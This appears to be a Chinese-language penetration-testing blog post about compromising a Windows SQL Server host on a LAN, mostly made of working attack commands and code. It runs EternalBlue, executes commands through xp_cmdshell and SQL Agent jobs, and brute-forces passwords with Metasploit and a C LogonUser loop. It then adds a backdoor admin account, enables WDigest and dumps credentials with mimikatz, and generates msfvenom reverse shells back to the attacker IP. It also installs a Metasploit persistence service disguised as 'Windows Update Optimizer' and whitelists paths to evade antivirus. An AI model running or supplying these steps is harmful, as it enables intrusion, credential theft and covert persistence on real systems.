---
tags: [SQL Server, 网络安全]
title: SQL Server 另类 getshell
last_modified_at: 2023-5-4
slug: sql-server-getshell
redirect_from: 
  - /posts/SQL_Server另类getshell
---

## 目标环境

本机IP地址：`192.168.1.233`，目标服务器IP地址：`192.168.1.66`

Windows Server 2008 R2，安装了360安全卫士，扫描结果大致如下：

```plaintext
80/tcp    open  http               Microsoft IIS httpd 7.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Enterprise 7600 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.1600.00; RTM
3389/tcp  open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

其中已经通过前端服务器的一句话木马，得到了运行于 1433 端口的 SQL Server 服务的账号与密码，即`sa:qwerty`

其中运行于 80 端口的 IIS 服务访问任何页面都是 404

## 尝试

### 远程桌面弱密码

用了[这个软件](https://github.com/7kbstorm/7kbscan-RDP-Sniper)跑，但其实根本没用——被360的安全登录拦了

### 永恒之蓝

445 开着，那直接跑个永恒之蓝试试：

```shell
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.1.66
exploit
```

非常成功的——被拦了。

```plaintext
[+] 192.168.1.66:445 - The target is vulnerable.
[-] 192.168.1.66:445 - Errno::ECONNRESET: An existing connection was forcibly closed by the remote host.
```

## SQL Server 部分

### xp_cmdshell

```sql
sp_configure 'show advanced options',1;
reconfigure;
go;
sp_configure 'xp_cmdshell',1;
reconfigure;
go;
```

然后直接`EXEC master..xp_cmdshell 'whoami';`就行了，但安全软件绝对会拦。

### sp_oacreate

具体可以看[这篇blog](https://blog.csdn.net/u014029795/article/details/116910134)，调用方式如下，但也被拦了

```sql
declare @shell int;
exec sp_oacreate 'wscript.shell',@shell output;
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami';
```

### 沙盒提权

依旧是[上面那篇blog](https://blog.csdn.net/u014029795/article/details/116910134)，复现时貌似没有找到`mdb`文件，失败。

### 文件管理

对于不涉及具体文件内容的，可以参考[这篇博文](https://www.cnblogs.com/ljhdo/p/4996060.html)。具体用到的指令如下：

```sql
exec master.sys.xp_fileexist 'D:\test.txt'
exec master.sys.xp_create_subdir 'D:\test'
exec master.sys.xp_dirtree 'D:\data', 2, 1 -- 参数依次为folder, depth, show_file
exec sys.xp_fixeddrives
```

### 文件读写

建议用下文的SQLTOOLS或MSDAT。

### 注册表操作

具体参见[这篇文章](https://sqlsolutionsgroup.com/working-registry-sql-server/)。相关存储过程如下：

| REGULAR |	INSTANCE-AWARE |
| --- | --- |
| sys.xp_regread | sys.xp_instance_regread |
| sys.xp_regenumvalues | sys.xp_instance_regenumvalues |
| sys.xp_regenumkeys | sys.xp_instance_regenumkeys |
| sys.xp_regwrite | sys.xp_instance_regwrite |
| sys.xp_regdeletevalue | sys.xp_instance_regdeletevalue |
| sys.xp_regdeletekey | sys.xp_instance_regdeletekey |
| sys.xp_regaddmultistring | sys.xp_instance_regaddmultistring |
| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |

所有的`hive`如下：

| REGISTRY HIVE |
| --- |
| HKEY_CURRENT_CONFIG |
| HKEY_CURRENT_USER |
| HKEY_LOCAL_MACHINE\SAM |
| HKEY_LOCAL_MACHINE\Security |
| HKEY_LOCAL_MACHINE\Software |
| HKEY_LOCAL_MACHINE\System |
| HKEY_USERS\.DEFAULT |

每个`hive`包含多个`key`（即注册表编辑器左边的文件夹），每个`key`可以包含其它`key`；每个`key`下面可以包含任意多组`value`，每组`value`由`名字`、`数据类型`、`数值`组成。

以下是一个查询示例：

```sql
EXECUTE master.sys.xp_regread 
    'HKEY_LOCAL_MACHINE', 
    'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 
    'WorkingDirectory';
```

### SQLTOOLS V2.0

集成了多种命令执行与文件管理等功能。[下载地址](http://www.ddooo.com/softdown/13370.htm)

### Metasploit

可以用于弱口令扫描与简化一些命令的执行。[详细教程](https://blog.csdn.net/et48_sec/article/details/42124387)

### WarSQLKit

使用CLR技术无文件落地加载dll。实际操作中由于版本问题无法加载。

链接：[MSSQL无落地文件执行Rootkit-WarSQLKit](https://www.cnblogs.com/backlion/p/12272799.html)

CLR技术详细教程：[MSSQL 利用 CLR 技术执行系统命令](https://cloud.tencent.com/developer/article/1736431)

### 向日葵远程控制

使用了[这个项目](https://github.com/wafinfo/Sunflower_get_Password)读取配置文件，但最终由于服务器端向日葵离线没有成功。

可能的数个配置文件读取命令：

```shell
type C:\Windows\System32\config\systemprofile\AppData\Roaming\Oray\SunloginClient\sys_config.ini
type "C:\Program Files\Oray\SunLogin\SunloginClient\config.ini"
type C:\ProgramData\Oray\SunloginClient\config.ini
reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo
reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo
```

## SharpSQLTools

[项目地址](https://github.com/uknowsec/SharpSQLTools)

支持文件上传下载，并内置了一些命令执行/提权工具。

## MSDAT

可以用于上传、下载文件，也有诸多其它功能。

[简略教程](https://www.freebuf.com/sectool/177187.html)

[项目主页](https://github.com/quentinhardy/msdat)

顺便丢一个乱写的目录上传脚本：

```python
import os
src=r"C:\ProgramData\ssh"
dst=r"C:\ProgramData\ssh"
exclude=[r"sshd.pid", r"sshd_config"]
files = [i for i in os.listdir(src) if i not in exclude]
for i in files:
 if os.path.isfile(os.path.join(src, i)):
  cmd = r'python C:\msdat-master\msdat.py  oleautomation -s 192.168.1.66 -U sa -P qwerty --put-file "' + os.path.join(src, i) + r'" "'+os.path.join(dst, i) + '"'
  print(cmd)
  os.system(cmd)
```

## SQL Server Management Studio

官方的[SQL Server管理工具](https://learn.microsoft.com/zh-cn/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16#download-ssms)，可以用来通过`作业`（`job`）提权。（也就是对`sp_add_job`等操作进行了图形化封装）

连接后，在以下路径可以管理作业，此处以shell作业举例。

SQL Server 代理 -> 作业 -> 步骤

类型：CmdExec

命令：默认只有第一行会执行，故不建议输入多行的命令

高级：可以使用“输出文件”保存作业输出

包含步骤输出、进程退出代码：把退出代码调为大于10的任意值，可以更方便地看stdout与stderr

完成配置后保存退出，右键“作业”，选择“作业开始步骤”运行。

作业活动监视器处右键，可查看历史记录

## 获得shell后的尝试

### whoami

用户是`Administrator`，但大部分操作都会被直接拦截。

使用[PsExec](https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec)可以提权到`SYSTEM`，具体来说是`PsExec -s cmd`，但基本没用。

### 重启向日葵

不知什么原因，没有达到目标效果。

### OpenSSH

用于密码爆破，可以说是最创新性的一部分。

具体来说，首先用上面的MSDAT传了[OpenSSH](https://github.com/PowerShell/Win32-OpenSSH/releases/)以及凭据、配置文件上去。

配置文件中，修改了监听端口、允许密码登录、禁用登录超时、删除`Match Group administrators`这一部分。

然后修复了文件权限（一行一行输）（实际情况可能还有不同，可仿照此部分自行调整）：

```shell
del C:\ProgramData\ssh\administrators_authorized_keys
icacls.exe "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant "Administrator:F" （上面这两行貌似没用）
icacls.exe "C:\Users\Administrator\.ssh\authorized_keys" /inheritance:r /grant "Administrator:F" /remove Administrators /remove SYSTEM
icacls C:\ProgramData\ssh\ /setowner Administrator /t /c /q
icacls C:\ProgramData\ssh\ /inheritance:r /t /c /q
icacls C:\ProgramData\ssh\ /grant Administrator:(F) /t /c /q
icacls C:\ProgramData\ssh\ssh_host_rsa_key （这一行只是用于查看的）
```

接着，用这行命令重启服务：

```shell
cmd /c "taskkill /f /im sshd.exe & C:\OpenSSH-Win64\sshd.exe"
```

然后用Metasploit爆破：

```shell
use auxiliary/scanner/ssh/ssh_login
set RHOST 192.168.1.66
set RPORT 52917
set USERNAME Administrator
set STOP_ON_SUCCESS true
set USER_AS_PASS true
set THREADS 16
set gatherproof false
set PASS_FILE "C:\password.txt"
run
```

然后……一秒内就出来了……我大受震撼.jpg

或者你也可以直接先用公钥连接过去，虽然应该没什么用。

```shell
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOST 192.168.1.66
set RPORT 52917
set USERNAME Administrator
set PRIVATE_KEY "" # 这是字符串形式的私钥，这里用不到
set KEY_PATH "C:\Users\Administrator\.ssh\id_rsa"
run
```

### 爆破密码的另一种方式（Windows API）

其实直接用下面的代码调用`LogonUser`函数理论也可以本地爆破密码，杀软一般不报毒。

```c
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#define LENGTH 2000

int main(){
    HANDLE hUser;
    int length = 0;
    const char* USERNAME = "Administrator";
    const char* PASSWORD_FILE = "password.txt";
    char PASSWORD[LENGTH] = "";
    freopen(PASSWORD_FILE, "r", stdin);
    do {
        length = strlen(PASSWORD);
        if(PASSWORD[length - 1] == '\n') { PASSWORD[--length] = '\0'; }
        if(PASSWORD[length - 1] == '\r') { PASSWORD[--length] = '\0'; }
        if(LogonUser(_T(USERNAME), _T("."), _T((const char*)PASSWORD), LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &hUser)) {
             printf("%s\r\n%s\r\nlength: %d", USERNAME, PASSWORD, strlen(PASSWORD));
             return 0;
        }
        else {
             // MessageBoxA(NULL,"ERROR",NULL,0);
        }
    } while (fgets(PASSWORD, LENGTH, stdin));
    printf("not found");
    return 1;
}
```

## 后渗透

### 安全软件

给几个常用目录加白名单或加入360“开发者模式”的路径，然后马就可以随便放啦。

### 账户添加

```shell
net user user password123 /add
net localgroup administrators user /add
```

### 系统账户凭据窃取

先用下面这条保存明文凭据（目标账户重新登录后生效）：

```shell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

然后就可以用mimikatz窃取了。建议直接在目标系统运行。

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

或者用meterpreter：

```shell
getsystem
load kiwi
kiwi_cmd sekurlsa::logonpasswords

# 或者

creds_all
```

### 远程桌面凭据窃取

适用于保存了远程桌面密码的系统。

比较复杂，[详细教程](https://blog.csdn.net/huyaguang/article/details/127071365)

或者用mimikatz直接解决，该方式可能需要先开启一个远程桌面连接（[具体说明](https://tools.thehacker.recipes/mimikatz/modules/ts)）：

```shell
privilege::debug
ts::mstsc
ts::logonpassword
```

### Metasploit权限维持

先生成个木马（分别为64位与32位）：

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7777 --platform Windows -f exe > s.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7778 -a x86 --platform Windows -f exe > s2.exe

```

然后在msfconsole中监听：

```shell
handler -H 192.168.1.233 -P 7777 -p windows/x64/meterpreter/reverse_tcp
handler -H 192.168.1.233 -P 7778 -p windows/meterpreter/reverse_tcp
```

上传木马，运行，不出意外的话就能收到session了。

接下来做权限维持。注意以下命令仅适用于64位系统，32位系统请自行参考注释内容调整。32位与64位必须与目标系统严格保持一致。

请注意，一切以`#`开头的内容都应被手动删除。不要把它们输入在命令中。

```shell
# use exploit/windows/local/persistence_service # 以服务方式安装
use exploit/windows/local/persistence
set lhost 192.168.1.233
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
# set payload windows/meterpreter/reverse_tcp
# set lport 7778
set SERVICE_NAME "Windows Update Optimizer"
set SERVICE_DESCRIPTION "Optimize Windows Update."
set RETRY_TIME 600 # 每次重连间隔
set delay 600 # 登录后等待时间
set session 3 # 这里改成你获得的session
run

# set STARTUP SYSTEM # 设置为系统登录时运行，而非默认的用户登录时运行。一般用不到。
```

以后需要连接的时候，用上面那两条`handler`命令监听即可。默认每十分钟重连一次。

## 其他参考资料

[MSSQL GetShell方法](https://xz.aliyun.com/t/8603)

[数据库安全之MSSQL渗透](https://www.freebuf.com/vuls/276814.html)

[数据库攻防之MSSQL](https://www.freebuf.com/articles/web/340788.html)

[记一次从站库分离的MSSQL注入到用xp_cmdshell进行内网漫游](https://zhuanlan.zhihu.com/p/601419548)（通过SQL注入执行`xp_cmdshell`并获得回显）

## 总结？

只能说，充斥着巨硬的风格。

一个数据库，为什么要有dll加载功能？为什么有无数种方法调用系统组件？

简单胜于复杂，而MSSQL毫不遵循KISS原则——带给用户的，就是安全软件都防不住的威胁。
